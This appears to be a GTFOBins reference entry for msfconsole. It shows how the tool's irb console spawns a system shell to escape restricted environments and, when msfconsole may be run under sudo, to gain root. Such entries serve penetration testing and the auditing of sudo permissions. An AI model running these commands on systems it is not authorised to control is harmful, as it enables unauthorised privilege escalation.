# GTFOBin: msfconsole

This allows to spawn a `ruby` interpreter.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
sudo msfconsole
msf6 > irb
>> system("/bin/sh")
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo msfconsole
msf6 > irb
>> system("/bin/sh")
```